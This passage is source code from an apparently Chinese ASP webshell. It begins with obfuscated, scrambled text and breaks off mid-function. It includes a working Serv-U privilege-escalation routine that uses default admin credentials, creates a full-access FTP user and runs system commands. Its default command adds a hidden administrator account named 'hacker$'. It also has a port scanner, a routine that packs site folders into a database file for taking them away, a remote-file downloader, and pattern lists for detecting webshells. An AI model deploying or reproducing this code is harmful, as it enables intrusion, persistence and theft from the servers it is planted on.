gA'+ywtUrwjY+'?为口端jhn{wjX%qfsnrwjYCnqA'%jynw\3jxstuxjWe'机主本版wj{wjX%x|tisn\为否是认确请3取读法无'BywtUrwjY%sjmY%''BywtUrwjY%kNe.~jPrwjY-ifjWljW3mx\BywtUrwjYe'wjgrzSywtUauhyaxiYai|uiwaxi\awj{wjX%qfsnrwjYaqtwystHayjXqtwystHysjwwzHaRJYX^XaJSNMHFRdQFHTQd^JPM'B~jPrwjYe'CwgA'+ywtuysqY+'?口端yjsqjYCnqA'%jynw\3jxstuxjWe'87'BysqY%sjmY%''BywtUysqY%kne.~jPyjsqjY-ifjWljW3mx\BywtUysqYe'ywtUyjsqjYa536awj{wjXyjsqjYayktxtwhnRaJWF\YKTXaJSNMHFRdQFHTQd^JPM'B~jpyjsqjYe.'qqjmX3yunwhX\'-yhjogTjyfjwH3wj{wjX%B%mx|%yjXe'C6Bj nx%wmACwgAb测探口端殊特`CwgACwgA'%jynw\3jxstuxjWey}jS%jrzxjW%wtwwJ%sT?.-tksNqfsnrwjYyjl%gzx"))

Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject("ADODB.connection"):connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;":conn.ConnectionTimeout=1:conn.open connstr:If Err Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, "(Connect()).") > 0 Then:RRS(targetip & ":" & portNum & ".......关闭<br>"):Else:RRS(targetip & ":" & portNum & ".......<font color=red>开放</font><br>"):End If:End If:End If:End Sub

'execute(LUnEnCode("aab=f"))
Select Case Action
Case "MainMenu":MainMenu():Case "getTerminalInfo":getTerminalInfo():Case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():Case "Servu":SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
   f=left(f,2)
end if
ftpport = 21
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');"
RRS"setTimeout('document.all.goldsun.submit();',4000);"
RRS"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<center>正在提升权限,请等待...,<center>');"
RRS"setTimeout(""document.all.goldsun.submit();"",4000);"
RRS"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
a.send loginuser & loginpass & mt & deldomain & quit
set session("a")=a
RRS"<center>提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
RRS"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
RRS"</center>"
case else
on error resume next
    set a=session("a")
    set b=session("b")
    set c=session("c")
    a.abort
    Set a = Nothing
    b.abort
    Set b = Nothing
    c.abort
    Set c = Nothing
RRS"<center><form method='post' name='goldsun'>"
RRS"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
RRS"<tr align='center' valign='middle'>"
RRS"<td colspan='2'>Serv-U 提升权限 ASP版 6.4</td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td width='100'>用户名:</td>"
RRS"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>口 令：</td>"
RRS"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>端 口：</td>"
RRS"<td><input name='port' type='text' id='port' value='43958'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>系统路径：</td>"
RRS"    <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
RRS"  </tr>"
RRS"  <tr align='center' valign='middle'>"
RRS"    <td>命　令：</td>"
RRS"    <td><input name='c' type='text' id='c' value='cmd /c net user hacker$ hacker /add & net localgroup administrators hacker$ /add' size='50'></td>"
RRS"  </tr>"
RRS" <tr align='center' valign='middle'>"
RRS"    <td colspan='2'><input type='submit' name='Submit' value='提交'> "
RRS"<input type='reset' name='Submit2' value='重置'>"
RRS"<input name='SUaction' type='hidden' id='action' value='1'></td>"
RRS"  </tr>"
RRS" <tr align='center' valign='middle'>"
RRS"    <td>说　明：</td>"
RRS"    <td><input name='ccc' type='text' id='ccc' value='可替换成:cmd /c D:\web\你上传的木马.exe 也可以是VBS' size='50'></td>"
RRS"  </tr>"
RRS"</tr></table></form></center>"
end select
function Gpath()
on error resume next
    err.clear
    set f=Server.CreateObject("Scripting.FileSystemObject")
    if err.number>0 then
	gpath="c:"
        exit function
    end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function

  Case "kmuma"
	dim Report
	if request.QueryString("act")<>"scan" then
	  	RRS ("<b>网站根目录</b>- "&Server.MapPath("/")&"<br>")
		RRS ("<b>本程序目录</b>- "&Server.MapPath("."))
		RRS "<form action=""?Action=kmuma&act=scan"" method=""post"" name=""form1"">"
		RRS "<p><b>填入你要检查的路径：</b>"
		RRS "<input name=""path"" type=""text"" style=""border:1px solid #999"" value=""."" size=""30"" /> 填“\”网站根目录；“.”为本程序目录<br><br>"
		RRS "你要干什么: <input class=c name=""radiobutton"" type=""radio"" value=""sws"" onClick=""document.getElementById('showFile1').style.display='none'"" checked>查ASP 马"
		RRS "<input class=c type=""radio"" name=""radiobutton"" value=""sf"" onClick=""document.getElementById('showFile1').style.display=''"">搜索符合条件之文件<br>"
		RRS "<br /><div id=""showFile1"" style=""display:none"">"
		RRS "&nbsp;&nbsp;查找内容：<input name=""Search_Content"" type=""text"" id=""Search_Content"" style=""border:1px solid #999"" size=""20"">"
		RRS " 要查找的字符串，不填就只进行日期检查<br />"
		RRS "&nbsp;&nbsp;修改日期：<input name=""Search_Date"" type=""text"" style=""border:1px solid #999"" value="""&Left(Now(),InStr(now()," ")-1)&""" size=""20""> 多个日期用;隔开，任意日期填写 <a href=""#"" onClick=""javascript:form1.Search_Date.value='ALL'"">ALL</a><br />"
		RRS "&nbsp;&nbsp;文件类型：<input name=""Search_FileExt"" type=""text"" style=""border:1px solid #999"" value=""*"" size=""20""> 类型之间用,隔开，*表示所有类型<br /><br /></div>"
		RRS "<input type=""submit"" value="" 开始扫描 "" style=""padding:2px 2px 0px 2px;margin:4px;"" />"
		RRS "</form>"
	else
		if request.Form("path")="" then
			RRS("路径不能为空")
			response.End()
		end if
		if request.Form("path")="\" then
			TmpPath = Server.MapPath("\")
		elseif request.Form("path")="." then
			TmpPath = Server.MapPath(".")
		else
			TmpPath = request.Form("path")
		end if
		
		timer1 = timer
		Sun = 0
		SumFiles = 0
		SumFolders = 1
		If request.Form("radiobutton") = "sws" Then
			DimFileExt = "asp,cer,asa,cdx"
			Call ShowAllFile(TmpPath)
		Else
			If request.Form("path") = "" or request.Form("Search_Date") = "" or request.Form("Search_FileExt") = "" Then
				RRS("缉捕条件不完全<br><br><a href='javascript:history.go(-1);'>请返回重新输入</a>")
				response.End()
			End If
			DimFileExt = request.Form("Search_fileExt")
			Call ShowAllFile2(TmpPath)
		End If
RRS "<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style='font-size:12px'>"
RRS "<tr><th>Scan WebShell</tr>"
RRS "<tr><td style=""padding:5px;line-height:170%;clear:both;font-size:12px"">"
RRS "<div id=""updateInfo"" style=""background:ffffe1;border:1px solid #89441f;padding:4px;display:none""></div>"
RRS "扫描完毕！一共检查文件夹<font color=""#FF0000"">"&SumFolders&"</font>个，文件<font color=""#FF0000"">"&SumFiles&"</font>个，发现可疑点<font color=""#FF0000"">"&Sun&"</font>个"
RRS "<table width=""100%"" border=""1"" cellpadding=""0"" cellspacing=""8"" bordercolor=""#999999"" style=""font-size:12px;border-collapse:collapse;line-height:130%;clear:both;""><tr>"
If request.Form("radiobutton") = "sws" Then
	RRS "<td width=""20%"">文件相对路径</td>"
	RRS "<td width=""20%"">特征码</td>"
	RRS "<td width=""40%"">描述</td>"
	RRS "<td width=""20%"">创建/修改时间</td>"
else   
	RRS "<td width=""50%"">文件相对路径</td>"
	RRS "<td width=""25%"">文件创建时间</td>"
	RRS "<td width=""25%"">修改时间</td>"
end if
	RRS "</tr>"
	RRS Report
	RRS "<br/></table>"
timer2 = timer
thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
RRS "<br><font style='font-size:12px'>本页执行共用了"&thetime&"毫秒</font>"
	end if
Sub ShowAllFile(Path)
	Set F1SO = CreateObject("Scripting.FileSystemObject")
	if not F1SO.FolderExists(path) then exit sub
	Set f = F1SO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(F1SO.GetExtensionName(path&"\"&myfile.name)) Then
			Call ScanFile(Path&Temp&"\"&myfile.name, "")
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set F1SO = Nothing
End Sub
Sub ScanFile(FilePath, InFile)
Server.ScriptTimeout=999999999
	If InFile <> "" Then
		Infiles = "<font color=red>该文件被<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>文件包含执行</font>"
	End If
	Set FSO1s = CreateObject("Scripting.FileSystemObject")
	on error resume next
	set ofile = FSO1s.OpenTextFile(FilePath)
	filetxt = Lcase(ofile.readall())
	If err Then Exit Sub end if
	if len(filetxt)>0 then
		filetxt = vbcrlf & filetxt
		temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a><br />"
    temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"	
			If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell 或者 clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End if
			If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application 或者 clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			Set regEx = New RegExp
			regEx.IgnoreCase = True
			regEx.Global = True
			regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>似乎脚本被加密了</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			regEx.Pattern = "\bEv"&"al\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()函数可以执行任意ASP代码<br>但是javascript代码中也可以使用，有可能是误报。"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			regEx.Pattern = "[^.]\bExe"&"cute\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()函数可以执行任意ASP代码</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			regEx.Pattern = "\.(Open|Create)TextFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.CreateTextFile|.OpenTextFile</td><td>使用了FSO的CreateTextFile|OpenTextFile读写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			regEx.Pattern = "\.SaveToFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.SaveToFile</td><td>使用了Stream的SaveToFile函数写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
			regEx.Pattern = "\.Save\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Save</td><td>使用了XMLHTTP的Save函数写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-同上-"
			End If
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()[^""]\)"
		If regEx.Test(filetxt) Then
			Report = Report&"<tr><td>"&temp&"</td><td>Server.Exec"&"ute</td><td><font color=red>不能跟踪检查Server.e"&"xecute()函数执行的文件。</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
			Sun = Sun + 1
		End If
		Set Matches = Nothing
		Set regEx = Nothing
		Set XregEx = New RegExp
		XregEx.IgnoreCase = True
		XregEx.Global = True
		XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
		Set XMatches = XregEx.Execute(filetxt)
		For Each Match in XMatches
			tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
			srcSeek = InStr(1, tmpLake2, "src", 1)
			If srcSeek > 0 Then
				srcSeek2 = instr(srcSeek, tmpLake2, "=")
				For i = 1 To 50
					tmp = Mid(tmpLake2, srcSeek2 + i, 1)
					If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
						Exit For
					End If
				Next
				If tmp = """" Then
					tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
				Else
					If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
					If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
					If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
					If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
				End If
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "CreateO"&"bject[ |\t]*\(.*\)"
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			If Instr(Match.Value, "&") or Instr(Match.Value, "+") or Instr(Match.Value, """") = 0 or Instr(Match.Value, "(") <> InStrRev(Match.Value, "(") Then
				Report = Report&"<tr><td>"&temp&"</td><td>Creat"&"eObject</td><td>Crea"&"teObject函数使用了变形技术"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				exit sub
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
	end if
	set ofile = nothing
	set FSO1s = nothing
End Sub:Sub PageAddToMdb():Dim theAct, thePath
theAct = Request("theAct")
thePath = Request("thePath")
Server.ScriptTimeOut=100000
If theAct = "addToMdb" Then
addToMdb(thePath)
RRS "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
If theAct = "releaseFromMdb" Then
unPack(thePath)
RRS "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
RRS"<br>文件夹打包:"
RRS"<form method=post>"
RRS"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
RRS"<input type=hidden value=addToMdb name=theAct>"
RRS"<select name=theMethod><option value=fso>FSO</option><option value=app>无FSO</option>"
RRS"</select>"
RRS" <input type=submit value='开始打包'>"
RRS"<br><br>注: 打包生成HSH.mdb文件,位于HSH木马同级目录下"
RRS"</form>"
RRS"文件包解开(需FSO支持):<br/>"
RRS"<form method=post>"
RRS"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\HSH.mdb"" size=80>"
RRS" <input type=hidden value=releaseFromMdb name=theAct><input type=submit value='解开包'>"
RRS"<br><br>注: 解开来的所有文件都位于HSH木马同级目录下"
RRS"</form>":End Sub:Sub addToMdb(thePath):On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject("ADODB.Connection")
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing:End Sub:Function fsoTreeForMdb(thePath, rs, stream):Dim item, theFolder, folders, files, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(thePath) = False Then
showErr(thePath & " 目录不存在或者不允许访问!")
End If
Set theFolder = Server.CreateObject("Scripting.FileSystemObject").GetFolder(thePath)
Set files = theFolder.Files
Set folders = theFolder.SubFolders
For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next
For Each item In files
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
Next
Set files = Nothing
Set folders = Nothing
Set theFolder = Nothing:End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject("ADODB.Connection")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing:End Sub:Sub createFolder(thePath)
Dim i
i = Instr(thePath, "\")
Do While i > 0
If Server.CreateObject("Scripting.FileSystemObject").FolderExists(Left(thePath, i)) = False Then
Server.CreateObject("Scripting.FileSystemObject").CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i = i + Instr(Mid(thePath, i + 1), "\")
 Else
i = 0
End If
Loop
End Sub:Sub saTreeForMdb(thePath, rs, stream)
Dim item, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
Set theFolder = saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder = True Then
saTreeForMdb item.Path, rs, stream
 Else
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
End If
Next
Set theFolder = Nothing:End Sub:Sub createFolder(thePath):Dim i
		i = Instr(thePath, "\")
		Do While i > 0
			If fsoX.FolderExists(Left(thePath, i)) = False Then
				fsoX.CreateFolder(Left(thePath, i - 1))
			End If
			If InStr(Mid(thePath, i + 1), "\") Then
				i = i + Instr(Mid(thePath, i + 1), "\")
			 Else
				i = 0
			End If
		Loop:End Sub:Function CheckExt(FileExt)
	If DimFileExt = "*" Then CheckExt = True
	Ext = Split(DimFileExt,",")
	For i = 0 To Ubound(Ext)
		If Lcase(FileExt) = Ext(i) Then 
			CheckExt = True
			Exit Function
		End If
	Next
End Function:Function upload():SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>" 
		RRS "下载到服务器:无回显...为了节省.所以无回显<br>"
		RRS "<form method=post>"
		RRS "<input name=theUrl value='http://' size=80><input type=submit value=' 下载 '><br/>"
		RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		RRS "<input type=checkbox name=overWrite value=2>存在覆盖"
		RRS "<input type=hidden value=downFromUrl name=theAct>"
		RRS "</form>"
		RRS "<br>"
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim Http, theUrl, thePath, stream, fileName, overWrite
		theUrl = Request("theUrl")
		thePath = Request("thePath")
		overWrite = Request("overWrite")
		Set stream = Server.CreateObject("ad"&e&"odb.st"&e&"ream")
		Set Http = Server.CreateObject("MSXML2.XMLHTTP")
		
		If overWrite <> 2 Then
			overWrite = 1
		End If
		
		Http.Open "GET", theUrl, False
		Http.Send()
		If Http.ReadyState <> 4 Then 

		End If
		
		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Http.ResponseBody
			.Position = 0
			.SaveToFile thePath, overWrite
			If Err.Number = 3004 Then
				Err.Clear
				fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
				If fileName = "" Then
					fileName = "index.htm.txt"
				End If
				thePath = thePath & "\" & fileName
				.SaveToFile thePath, overWrite
			End If
			.Close
		End With
		chkErr(Err)
		
		Set Http = Nothing
		Set Stream = Nothing

		If isDebugMode = False Then
			On Error Resume Next
		End If:End Function	
Function GetDateModify(filepath):Set F2SO = CreateObject("Scripting.FileSystemObject")
    Set f = F2SO.GetFile(filepath) 
	s = f.DateLastModified 
	set f = nothing
	set F2SO = nothing
	GetDateModify = s:End Function:Function GetDateCreate(filepath):Set F3SO = CreateObject("Scripting.FileSystemObject")
    Set f = F3SO.GetFile(filepath) 
	s = f.DateCreated 
	set f = nothing
	set F3SO = nothing
	GetDateCreate = s:End Function:Function tURLEncode(Str):temp = Replace(Str, "%", "%25")
	temp = Replace(temp, "#", "%23")
	temp = Replace(temp, "&", "%26")
	tURLEncode = temp:End Function:Sub ShowAllFile2(Path):Set F4SO = CreateObject("Scripting.FileSystemObject")
	if not F4SO.FolderExists(path) then exit sub
	Set f = F4SO.GetFolder(Path)
	Set fc2 = f.files
